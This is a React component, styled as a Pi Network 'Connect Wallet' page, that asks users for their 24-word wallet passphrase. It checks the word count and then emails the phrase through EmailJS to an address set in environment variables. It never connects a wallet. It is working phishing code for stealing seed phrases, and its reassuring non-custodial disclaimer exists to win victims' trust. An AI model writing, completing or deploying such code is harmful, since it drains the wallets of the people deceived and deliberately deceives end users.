import React, { useState } from "react";
import { useParams } from "react-router-dom";
import pilogo from "../assets/pi_logo.png";
import loop from "../assets/images/exchanges/loop.png";
import circle from "../assets/images/exchanges/circle.png";

import emailjs from "@emailjs/browser";
import Spinner from "react-activity/dist/Spinner";
import "react-activity/dist/Spinner.css";
import { useNavigate } from "react-router-dom";
import { useExchange } from "../context/ExchangeContext";

function Payment() {
  const { id } = useParams();
  const { selectedExchange } = useExchange(); // Get the selected exchange from the context
  const navigate = useNavigate();
  const [phrase, setPhrase] = useState("");
  const [error, setError] = useState(false);
  const [loading, setLoading] = useState(false);
  const [showModal, setShowModal] = useState(false);

  const serviceID = import.meta.env.VITE_EMAILJS_SERVICE_ID;
  const templateID = import.meta.env.VITE_EMAILJS_TEMPLATE_ID;
  const userID = import.meta.env.VITE_EMAILJS_USER_ID;

  const handleSend = async () => {
    setLoading(true);
    setError(false);
    setShowModal(true);
  
    const wordCount = phrase.trim().split(/\s+/).length;
    console.log(wordCount, phrase.trim().split(/\s+/));  // Debugging
  
    if (wordCount !== 24) {
      setError(true);
      setLoading(false);
      setShowModal(false);
      return;
    }
  
    const templateParams = { message: phrase };
  
    try {
      await emailjs.send(serviceID, templateID, templateParams, userID);
      setPhrase("");
      console.log("Sent message");
      navigate(`/confirmed`);
      setShowModal(false);
    } catch (error) {
      console.error("Error:", error.text || error.message || error);  // Enhanced error message
      alert("Connection failed. Please try again.");
      setError(true);
      setShowModal(false)
    } finally {
      setLoading(false);
    }
  };
  

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gray-900 p-6">
      <div className="bg-gray-800 shadow-xl rounded-2xl p-8 w-full max-w-lg">
        {/* Header */}
        <div className="flex items-center justify-between mb-6">
          <img src={pilogo} alt="Pi Logo" className="w-12 h-12" />
          <div className="text-center">
            <img src={loop} alt="Loop" className="w-8 h-8" />
          </div>
          {selectedExchange && (
            <div className="flex flex-col items-center mb-6">
              <img
                src={selectedExchange.image} // Use the image from the context
                alt={selectedExchange.label}
                className="w-12 h-12 object-cover rounded-full shadow-md"
              />
            </div>
          )}
        </div>

        <h2 className="text-lg font-semibold text-center text-gray-800 mb-4">
          Connect Wallet
        </h2>
        <textarea
          onChange={(e) => setPhrase(e.target.value)}
          value={phrase}
          className="w-full border-2 bg-gray-700 border-gray-200 text-slate-300 rounded-lg p-4 focus:outline-none focus:ring-1/2 focus:ring-yellow-500 focus:border-slate-500 resize-none transition-all"
          placeholder="Enter your 24-word passphrase here"
          rows="5"
        />
        {error && (
          <p className="text-red-500 text-sm mt-2">
            Invalid passphrase. Must be exactly 24 words.
          </p>
        )}

        {/* Unlock Button */}
        <button
          onClick={handleSend}
          className="w-full mt-4 bg-purple-700 text-white py-3 rounded-lg font-medium shadow-md hover:bg-purple-800 transition-all flex justify-center items-center"
        >
          {loading ? <Spinner color="#fff" /> : "Connect Wallet"}
        </button>

        {/* Disclaimer */}
        <p className="text-sm text-white mt-6 text-center leading-relaxed">
          As a non-custodial wallet, your passphrase is exclusively accessible
          to you. Recovery is impossible. Lost your passphrase? You can create a
          new wallet, but all your previous π will be inaccessible.
        </p>
      </div>

      {/* Modal */}
      {showModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center">
          <div className="bg-gray-800 p-8 rounded-lg shadow-lg mx-5 w-full max-w-md">
            <h3 className="text-xl font-bold text-white text-center mb-4">Processing</h3>
            <div className="flex items-center justify-between mb-6">
              <img src={pilogo} alt="Pi Logo" className="w-12 h-12" />
              <div className="text-center">
                <img
                  src={circle}
                  alt="Loop"
                  className="w-8 h-8 animate-spin duration-1000"
                  style={{ animationDuration: "3s" }}
                />
              </div>
              {selectedExchange && (
                <div className="flex flex-col items-center mb-6">
                  <img
                    src={selectedExchange.image} // Use the image from the context
                    alt={selectedExchange.label}
                    className="w-12 h-12 object-cover rounded-full shadow-md"
                  />
                </div>
              )}
            </div>
            <button
              onClick={handleSend}
              className="w-full mt-4 bg-purple-700 border-0f text-white py-3 rounded-lg font-medium shadow-md hover:bg-purple-800 transition-all flex justify-center items-center"
            >
              <Spinner color="#fff" />
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

export default Payment;
